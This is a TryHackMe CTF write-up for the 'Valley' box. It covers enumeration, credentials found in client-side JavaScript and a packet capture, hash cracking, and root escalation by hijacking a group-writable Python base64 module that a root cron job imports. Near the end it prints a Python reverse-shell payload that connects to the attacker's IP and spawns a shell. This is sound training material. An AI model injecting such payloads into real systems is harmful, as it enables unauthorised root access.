---
title: THM Valley Writeup
date: 2024-03-30 10:58 -0400
categories: [Writeups, TryHackMe]
tags: [valley, ctf]
---

# Intro
This box askes us to find a user and root flag, not much else in regards to direction or hints.

Let's start with
## Enumeration
```terminal
rustscan -a 10.10.2.80
```
*I like using rustscan initally as it is fast and works pretty well. We can run an nmap scan later to confirm services and look at all ports if we need to.*
```terminal
PORT      STATE SERVICE REASON
22/tcp    open  ssh     syn-ack
80/tcp    open  http    syn-ack
37370/tcp open  unknown syn-ack
```
Three ports is enough to start, lets dig a bit deeper into the service versions and underyling OS with Nmap. Verbose flags can result in noisy output so lets save this to a file for later reference.
```terminal
nmap -sV -sC -A -O -vv -p 22,80,37370 10.10.2.80 > initNmapScan
```
```terminal
PORT      STATE SERVICE REASON         VERSION
22/tcp    open  ssh     syn-ack ttl 64 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http    syn-ack ttl 64 Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
37370/tcp open  ftp     syn-ack ttl 64 vsftpd 3.0.3
MAC Address: 02:E2:8A:01:FA:87 (Unknown)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 3.8 (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%), Linux 3.2 - 4.8 (92%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.60%E=4%D=3/30%OT=22%CT=%CU=37485%PV=Y%DS=1%DC=D%G=N%M=02E28A%TM=6608523A%P=x86_64-pc-linux-gnu)
SEQ(SP=10A%GCD=1%ISR=10B%TI=Z%CI=Z%TS=A)
SEQ(SP=10A%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)
OPS(O1=M2301ST11NW7%O2=M2301ST11NW7%O3=M2301NNT11NW7%O4=M2301ST11NW7%O5=M2301ST11NW7%O6=M2301ST11)
WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)
ECN(R=Y%DF=Y%T=40%W=F507%O=M2301NNSNW7%CC=Y%Q=)
T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 49.420 days (since Sat Feb 10 07:50:45 2024)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=266 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OSs: Linux, Unix; CPE: cpe:/o:linux:linux_kernel
```

So now we know we are working with a linux machine most likely. We have a few routes to enumerate from here, but I am lazy and like to go for the lowest hanging fruit first.
From the output we can see port 37370 is open and hosting an FTP service
```terminal
37370/tcp open  ftp     syn-ack ttl 64 vsftpd 3.0.3
```

Let's see if they allow for anonymous connections:
```terminal
root@ip-10-10-253-34:~# ftp 10.10.2.80 37370
Connected to 10.10.2.80.
220 (vsFTPd 3.0.3)
Name (10.10.2.80:root): anonymous
331 Please specify the password.
Password:
530 Login incorrect.
Login failed.
ftp> 
```
Nope, well now lets move onto the webpage hosted on port 80.

Before I start looking around the website manually, I like to begin some enumeration with gobuster so it can run in the background if needed.
```terminal
gobuster dir -u http://10.10.2.80:80 -w /usr/share/wordlists/dirb/common.txt
```
These folders were available on the website
```terminal
/.htaccess (Status: 403)
/.hta (Status: 403)
/.htpasswd (Status: 403)
/gallery (Status: 301)
/index.html (Status: 200)
/pricing (Status: 301)
/server-status (Status: 403)
/static (Status: 301)
```
We want to look into the directories with a 301 response
```terminal
gobuster dir -u http://10.10.2.80:80/pricing -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -x html,txt
```
```terminal
/pricing.html (Status: 200)
/note.txt (Status: 200)
```
Lets investigate note.txt
```terminal
root@ip-10-10-253-34:~# curl http://10.10.2.80/pricing/note.txt
J,
Please stop leaving notes randomly on the website
-RP
```
This may reveal a users information later on, lets save it for later.
```terminal
gobuster dir -u http://10.10.2.80:80/gallery -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -x html,txt
```
```terminal
/gallery.html (Status: 200)
```
```terminal
gobuster dir -u http://10.10.2.80:80/static -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -x html,txt
```
```terminal
/1 (Status: 200)
/3 (Status: 200)
/5 (Status: 200)
/2 (Status: 200)
/4 (Status: 200)
/00 (Status: 200)
/10 (Status: 200)
/16 (Status: 200)
/12 (Status: 200)
/17 (Status: 200)
/13 (Status: 200)
/18 (Status: 200)
/14 (Status: 200)
/11 (Status: 200)
/15 (Status: 200)
/6 (Status: 200)
/8 (Status: 200)
/7 (Status: 200)
/9 (Status: 200)
```

Now we have a good reference of the site layout and what directories and files are available. Lets navigate to the page on our browser
![website-screenshot](assets/img/writeupscreenshots/valley-1.png)

Two buttons and some text, lets look at the source:
![website-screenshot](assets/img/writeupscreenshots/valley-2.png)
Nothing interesting here, links to the pages we found earlier are visible

Clicking the first button on the page takes us to /gallery.html
![website-screenshot](assets/img/writeupscreenshots/valley-3.png)
A page full of pictures, with a button to return home, lets look at the source:
![website-screenshot](assets/img/writeupscreenshots/valley-4.png)
So it looks like the images correlate to what we found earlier with gobuster, however there is no mention of the /00 directory in the source. This may be something to investigate.

Lets look at the final page we know of, which the second button leads to:
![website-screenshot](assets/img/writeupscreenshots/valley-5.png)
Nothing interesting here, looking at the source:
![website-screenshot](assets/img/writeupscreenshots/valley-6.png)
Nothing interesting here either... lets see if that /00 directory gives us something. 

```terminal
root@ip-10-10-253-34:~# curl http://10.10.2.80/static/00
dev notes from valleyDev:
-add wedding photo examples
-redo the editing on #4
-remove /dev1243224123123
-check for SIEM alerts
```
Very interesting, we can gather some more information for further enumeration from this. It appears at some point in time there was a /dev1243224123123 folder. Let's see if it still exists.
![website-screenshot](assets/img/writeupscreenshots/valley-7.png)
A login page! Let us check the source first as always.
![website-screenshot](assets/img/writeupscreenshots/valley-8.png)
We see a simple login form, but two custom js files, lets see if they have anything juicy

First we look at button.js
![website-screenshot](assets/img/writeupscreenshots/valley-9.png)
Nothing interesting, lets check out dev.js
![website-screenshot](assets/img/writeupscreenshots/valley-10.png)
This function contains the logic for the submit click, and the username / password validation. Upon further examination, the login information is hardcoded, giving us a username and password, aswell as the location of another note
```javascript
    if (username === "siemDev" && password === "REDACTED") {
        window.location.href = "/dev1243224123123/devNotes37370.txt";
```

Lets see what the note says:
```terminal
root@ip-10-10-253-34:~# curl http://10.10.2.80/dev1243224123123/devNotes37370.txt
dev notes for ftp server:
-stop reusing credentials
-check for any vulnerabilies
-stay up to date on patching
-change ftp port to normal port
```
## First user credentials
Remeber that ftp service from earlier?? Let's see if these credentials we just found work with them.

```terminal
ftp 10.10.2.80 37370
Connected to 10.10.2.80.
220 (vsFTPd 3.0.3)
Name (10.10.2.80:root): siemDev
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-rw-r--    1 1000     1000         7272 Mar 06  2023 siemFTP.pcapng
-rw-rw-r--    1 1000     1000      1978716 Mar 06  2023 siemHTTP1.pcapng
-rw-rw-r--    1 1000     1000      1972448 Mar 06  2023 siemHTTP2.pcapng
226 Directory send OK.
```
Credentials work well, and after listing the directory we see there are 3 pcaps available. Let's download them and take a closer look.
The FTP and HTTP1 pcap do not hold anything interesting, but this in the HTTP2 caught my eye.
![website-screenshot](assets/img/writeupscreenshots/valley-11.png)

This means there was a form submitted - over http... credentials again?
![website-screenshot](assets/img/writeupscreenshots/valley-12.png)
After filtering by this we see packet 2335 is the only packet with that protocol, and we get another set of credentials:
*valleyDev:REDACTED*

Lets try to login to FTP with these credentials as well:
```terminal
ftp 10.10.235.73 37370
Connected to 10.10.235.73.
220 (vsFTPd 3.0.3)
Name (10.10.235.73:root): valleyDev
331 Please specify the password.
Password:
500 OOPS: vsftpd: refusing to run with writable root inside chroot()
Login failed.
421 Service not available, remote server has closed connection
ftp> 
```
## Second user credentials
Well, that seems to not be working, lets try ssh with the same credentials
```terminal
ssh valleyDev@10.10.235.73
valleyDev@10.10.235.73's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-139-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 * Introducing Expanded Security Maintenance for Applications.
   Receive updates to over 25,000 software packages with your
   Ubuntu Pro subscription. Free for personal use.

     https://ubuntu.com/pro
valleyDev@valley:~$
```
Nice.   Let's get our first flag and see if the other credentials work on this box aswell.
```terminal
valleyDev@valley:~$ ls
user.txt
valleyDev@valley:~$ cat user.txt
THM{REDACTED}
```
```terminal
valleyDev@valley:~$ su siemDev
Password: 
$ whoami
siemDev
$ 
```
Reusing credentials is so bad, lets see what other users we have.
```terminal
$ ls -la /home
total 752
drwxr-xr-x  5 root      root        4096 Mar  6  2023 .
drwxr-xr-x 21 root      root        4096 Mar  6  2023 ..
drwxr-x---  4 siemDev   siemDev     4096 Mar 20  2023 siemDev
drwxr-x--- 16 valley    valley      4096 Mar 20  2023 valley
-rwxrwxr-x  1 valley    valley    749128 Aug 14  2022 valleyAuthenticator
drwxr-xr-x  5 valleyDev valleyDev   4096 Mar 13  2023 valleyDev
```
One more user named valley, and an executable. Lets get that over to our machine to analyze it.
```terminal
scp valleyDev@10.10.235.73:/home/valleyAuthenticator valleyAuthenticator
```
```terminal
root@ip-10-10-98-131:~# file valleyAuthenticator 
valleyAuthenticator: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, stripped
```
We see it is in ELF format, we can use `strings` to analyze the file, but I find it noisy and ghidra can do a better job. Let's start by looking at the strings.
![website-screenshot](assets/img/writeupscreenshots/valley-13.png)
No intelligible strings besides "packed with the UPX executable packer", after performing research into the upx packer and visiting the url included, we can see this is easily unpacked with the upx application. We can download the latest release from github and hopefully have a better view into the internal workings.
```terminal
root@ip-10-10-98-131:~/upx-4.2.3-amd64_linux# ./upx -d '../valleyAuthenticator' -o '../valleyUnpacked'
                       Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2024
UPX 4.2.3       Markus Oberhumer, Laszlo Molnar & John Reiser   Mar 27th 2024

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
   2290962 <-    749128   32.70%   linux/amd64   valleyUnpacked

Unpacked 1 file.
```
Looking again with ghidra at the newly unpacked executable, we can find two md5 strings right above the program prompts.
![website-screenshot](assets/img/writeupscreenshots/valley-14.png)
## Third user credentials
We could use hashcat or john to try and crack this, but lets see if our favorite online site has them first.
![website-screenshot](assets/img/writeupscreenshots/valley-15.png)
Here we have a set of credentials! *valley:REDACTED*
Let's see if they work on the box:
```terminal
$ su valley
Password: 
valley@valley:/home/valleyDev$ 
```
Tsk, tsk, tsk. not good password policy.
## Privilege Escalation
After doing some enumeration, we stumble upon:
```terminal
valley@valley:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
1  *    * * *   root    python3 /photos/script/photosEncrypt.py
```
Our first hint at a possible privilege escalation, lets see the permissions on this file.

```terminal
valley@valley:/photos/script$ ls -la photosEncrypt.py
-rwxr-xr-x 1 root root 621 Mar  6  2023 photosEncrypt.py
```
Unfortunate, lets take a look inside.
```python
#!/usr/bin/python3
import base64
for i in range(1,7):
# specify the path to the image file you want to encode
	image_path = "/photos/p" + str(i) + ".jpg"

# open the image file and read its contents
	with open(image_path, "rb") as image_file:
          image_data = image_file.read()

# encode the image data in Base64 format
	encoded_image_data = base64.b64encode(image_data)

# specify the path to the output file
	output_path = "/photos/photoVault/p" + str(i) + ".enc"

# write the Base64-encoded image data to the output file
	with open(output_path, "wb") as output_file:
    	  output_file.write(encoded_image_data)
```
We can see it imports base64, lets see if we have anyway to inject ourselves in here.
```terminal
valley@valley:/photos/script$ locate base64
...
/usr/lib/python3.8/base64.py
...
```
This one is the only one that matters, lets look at our permissions
```terminal
valley@valley:~$ ls -la /usr/lib/python3.8/base64.py 
-rwxrwxr-x 1 root valleyAdmin 20382 Mar 13  2023 /usr/lib/python3.8/base64.py
```
```terminal
valley@valley:~$ id
uid=1000(valley) gid=1000(valley) groups=1000(valley),1003(valleyAdmin)
```
As valley is a member of the valleyAdmin group, this means we can edit the file and inject some code! Lets get to it.
```python
import socket,os,pty
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.98.131",4445))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
pty.spawn("/bin/sh")
```
I will use this short code snippet to send myself a shell after opening a listener with netcat
```terminal
nc -lvnp 4445
```
We can wait or try and run crontab if you are impatient.
```terminal
Listening on [0.0.0.0] (family 0, port 4445)
Connection from 10.10.235.73 37952 received!
# whoami
whoami
root
# cat /root/root.txt
cat /root/root.txt
THM{REDACTED}
```
That's all folks!

This was a very fun box to go through that touched on a lot of important skills and concepts, pivot, pivot, pivot!
